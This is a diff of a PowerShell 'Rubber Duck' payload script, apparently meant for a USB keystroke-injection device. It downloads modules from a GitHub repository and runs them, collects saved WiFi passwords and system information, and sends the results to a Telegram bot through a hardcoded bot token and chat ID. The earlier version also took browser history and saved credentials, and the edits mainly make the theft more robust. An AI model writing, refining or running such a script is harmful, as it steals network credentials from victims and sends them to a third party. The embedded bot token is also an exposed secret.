@@ -2,72 +2,102 @@
 .SYNOPSIS
     Rubber Duck Data Collection Script
 .DESCRIPTION
-    Collects WiFi passwords, browser history, and saved credentials, then sends to Telegram bot.
+    Collects WiFi passwords and basic system info, then sends to Telegram bot.
 .NOTES
-    This script should be hosted on GitHub and called with a single command.
+    GitHub: https://github.com/OGRYZOK-dev/RubberDuck
 #>
 
 # Configuration
 $TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
 $CHAT_ID = "6525689863"
-$REPO_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/"
+$REPO_URL = "https://raw.githubusercontent.com/OGRYZOK-dev/RubberDuck/main/"
 
 # Temporary directory
 $tempDir = "$env:TEMP\RubberDuck"
-if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir | Out-Null }
+try {
+    if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }
+}
+catch {
+    exit 1
+}
 
-# Download modules from GitHub
+# Improved module download with error handling
 function Download-Module {
     param ($moduleName)
     $url = "$REPO_URL/modules/$moduleName"
     $output = "$tempDir\$moduleName"
+    
     try {
-        Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction Stop
+        Write-Output "Downloading module: $moduleName"
+        (New-Object System.Net.WebClient).DownloadFile($url, $output)
         return $true
     }
     catch {
+        Write-Output "Failed to download module: $moduleName"
         return $false
     }
 }
 
-# Import modules
-$modules = @("wifi.ps1", "browser.ps1", "telegram.ps1")
+# Import modules with better error handling
+$modules = @("wifi.ps1", "system.ps1", "telegram.ps1")
 foreach ($module in $modules) {
     if (Download-Module $module) {
-        . "$tempDir\$module"
-    }
-    else {
-        # Send error to Telegram if module fails to download
-        Send-TelegramMessage -Token $TOKEN -ChatID $CHAT_ID -Message "Failed to download module: $module"
-        exit 1
+        try {
+            . "$tempDir\$module"
+            Write-Output "Successfully loaded module: $module"
+        }
+        catch {
+            Write-Output "Failed to load module: $module"
+            continue
+        }
     }
 }
 
-# Main collection function
+# Main collection function with try-catch
 function Collect-AllData {
     $output = @()
     
-    # Get WiFi passwords
-    $wifiData = Get-WifiPasswords
-    $output += "=== WiFi Passwords ==="
-    $output += $wifiData
+    try {
+        $output += "=== System Information ==="
+        $output += Get-SystemInfo
+    }
+    catch {
+        $output += "Error getting system info: $_"
+    }
     
-    # Get browser data
-    $browserData = Get-BrowserData
-    $output += "`n=== Browser Data ==="
-    $output += $browserData
+    try {
+        $output += "`n=== WiFi Passwords ==="
+        $output += Get-WifiPasswords
+    }
+    catch {
+        $output += "Error getting WiFi passwords: $_"
+    }
     
     return ($output -join "`n")
 }
 
-# Execute collection and send to Telegram
+# Execute with comprehensive error handling
 try {
     $collectedData = Collect-AllData
-    Send-TelegramMessage -Token $TOKEN -ChatID $CHAT_ID -Message $collectedData
     
-    # Cleanup
-    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+    # Truncate if too long for Telegram (max 4096 chars)
+    if ($collectedData.Length -gt 4000) {
+        $collectedData = $collectedData.Substring(0, 4000) + "...[TRUNCATED]"
+    }
+    
+    Send-TelegramMessage -Token $TOKEN -ChatID $CHAT_ID -Message $collectedData
 }
 catch {
-    Send-TelegramMessage -Token $TOKEN -ChatID $CHAT_ID -Message "Error during data collection: $_"
+    $errorMsg = "Main execution error: $_"
+    try {
+        Send-TelegramMessage -Token $TOKEN -ChatID $CHAT_ID -Message $errorMsg
+    }
+    catch {
+        # Final fallback if even Telegram fails
+        Write-Output $errorMsg
+    }
+}
+finally {
+    # Cleanup with error suppression
+    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 }
